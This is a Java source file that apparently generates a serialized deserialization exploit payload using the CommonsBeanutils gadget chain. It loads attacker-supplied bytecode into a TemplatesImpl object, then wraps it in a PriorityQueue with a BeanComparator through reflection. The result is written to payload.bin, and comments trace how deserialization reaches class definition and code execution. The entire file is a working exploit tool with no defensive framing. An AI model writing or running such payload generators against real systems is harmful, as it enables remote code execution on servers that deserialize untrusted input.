import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.util.*;

public class Gen {
    static void f(Object o, String n, Object v) throws Exception {
        Field fd = o.getClass().getDeclaredField(n);
        fd.setAccessible(true);
        fd.set(o, v);
    }

    public static void main(String[] a) throws Exception {
        String cmd = a[0];

        // ---- TemplatesImpl payload (reflection: no internal API refs in this class) ----
        TemplatesImpl tpl = new TemplatesImpl();
        byte[] cls = java.util.Base64.getDecoder().decode(a[1]);
        f(tpl, "_bytecodes", new byte[][]{cls, cls});
        f(tpl, "_name", "c");
        try {
            Class tfC = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl");
            f(tpl, "_tfactory", tfC.getDeclaredConstructor().newInstance());
        } catch (Throwable t) {
            f(tpl, "_tfactory", null);  // JDK8 target doesn't need it
        }

        // ---- BeanComparator(Comparable) — raw Comparator type ----
        Class bcC = Class.forName("org.apache.commons.beanutils.BeanComparator");
        Comparator cmp = (Comparator) bcC.getConstructor(new Class[]{String.class})
                .newInstance(new Object[]{"outputProperties"});

        // ---- PriorityQueue<Comparator> raw + TemplatesImpl as Comparable ----
        PriorityQueue q = new PriorityQueue(2, cmp);
        Object[] seed = new Object[]{BigInteger.ONE, BigInteger.ONE};
        Field qf = q.getClass().getDeclaredField("queue");
        qf.setAccessible(true);
        qf.set(q, seed);
        Field szf = q.getClass().getDeclaredField("size");
        szf.setAccessible(true);
        szf.set(q, 2);

        Class[] raw = {Comparable.class};
        // force cast into raw Object[] then set — compile-time type erased
        Object[] items = (Object[]) qf.get(q);
        items[0] = tpl;
        items[1] = tpl;

        // patch templates var into gadget via BeanComparator.compare path:
        // PriorityQueue.siftDown -> BeanComparator.compare(tpl,tpl) ->getProperty(tpl,"outputProperties")
        // -> TemplatesImpl.getOutputProperties() -> newTransformer() -> defineClass(Evil) -> static init
        // (BeansIntrospector resolves "outputProperties" on TemplatesImpl directly)

        // serialize
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(q);
        oos.close();
        byte[] data = bos.toByteArray();
        FileOutputStream fo = new FileOutputStream("payload.bin");
        fo.write(data);
        fo.close();
        System.out.println("payload.bin " + data.length + " bytes");
    }
}
